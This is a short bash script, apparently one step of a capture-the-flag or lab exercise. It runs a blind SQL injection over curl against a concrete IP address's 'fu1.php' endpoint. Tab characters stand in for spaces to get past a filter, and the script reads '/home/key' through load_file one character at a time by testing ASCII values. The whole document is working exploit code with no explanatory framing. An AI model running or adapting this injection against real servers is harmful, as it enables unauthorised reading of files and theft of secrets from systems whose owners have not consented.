#!/bin/bash
# Check what character is at position 4
for ascii in 10 13 0 9 32; do
  curl -s "http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=${ascii}%23" > /tmp/pos4-${ascii}.html
  if grep -q "admin" /tmp/pos4-${ascii}.html; then
    echo "Position 4: ASCII $ascii FOUND"
    exit 0
  fi
done
echo "Position 4: None of [10,13,0,9,32] matched"
